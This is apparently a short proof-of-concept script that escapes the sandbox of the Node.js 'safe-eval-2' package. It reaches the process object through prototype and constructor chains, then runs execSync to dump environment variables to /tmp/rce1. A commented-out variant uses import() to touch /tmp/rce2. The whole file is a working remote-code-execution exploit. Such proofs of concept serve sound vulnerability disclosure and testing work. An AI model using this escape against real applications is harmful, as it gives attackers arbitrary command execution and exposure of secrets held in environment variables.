const safeEval = require("safe-eval-2");

const code = `
    
    (function() {
      // one or the other
      hasOwnProperty.__proto__.constructor('return process')().mainModule.require('child_process').execSync('env > /tmp/rce1');

      // import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('touch /tmp/rce2')
    })()
    
  `;

safeEval(code);
